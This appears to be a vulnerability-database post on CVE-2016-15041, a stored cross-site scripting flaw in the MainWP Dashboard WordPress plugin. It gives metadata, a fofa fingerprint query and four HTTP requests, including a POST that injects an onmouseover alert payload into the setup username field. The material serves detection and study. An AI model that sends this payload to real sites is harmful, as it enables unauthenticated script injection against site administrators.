---
layout: post
cve_id: CVE-2016-15041
title: MainWP Dashboard <= 3.1.2 - Stored Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2016/CVE-2016-15041.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2016/CVE-2016-15041.yaml
snort2_rule: N/A
snort3_rule: N/A
author: flame
severity: high
impact: 'Unauthenticated attackers can inject scripts that execute in users'' browsers,
  potentially leading to session hijacking, defacement, or redirection.

  '
remediation: 'Update to the latest version of the plugin that addresses this vulnerability.

  '
reference:
- https://klikki.fi/mainwp-admin-panel-unauthenticated-stored-xss/
metadata:
  verified: true
  max-request: 4
  fofa-query: /wp-content/plugins/mainwp/
tags:
- cve
- cve2016
- mainwp
- wordpress
- xss
- wp
- wp-plugin
- kev
- vkev
---

## ðŸ” Vulnerability Description
MainWP Dashboard â€“ The Private WordPress Manager for Multiple Website Maintenance plugin for WordPress versions up to 3.1.2 contains a stored cross-site scripting caused by insufficient input sanitization and output escaping in 'mwp_setup_purchase_username' parameter, letting unauthenticated attackers inject and execute arbitrary scripts when users access affected pages.


## ðŸŒ HTTP Request
```nohighlight
GET /wp-content/plugins/mainwp-vuln/readme.txt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /wp-admin/admin-post.php?page=mainwp-setup&step=purchase_extension HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin-post.php?page=mainwp-setup&step=purchase_extension&_wpnonce=6x0cxi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_2; en) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.18
Connection: close
Content-Length: 142
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

mwp_setup_purchase_username=38FhaZoWVEOYs2ihPoGIwmbDSCx"+onmouseover%3Dalert(document.domain)+x%3D"&mwp_setup_purchase_passwd=test&save_step=1
```

```nohighlight
GET /wp-admin/admin-post.php?page=mainwp-setup&step=purchase_extension HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.2 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

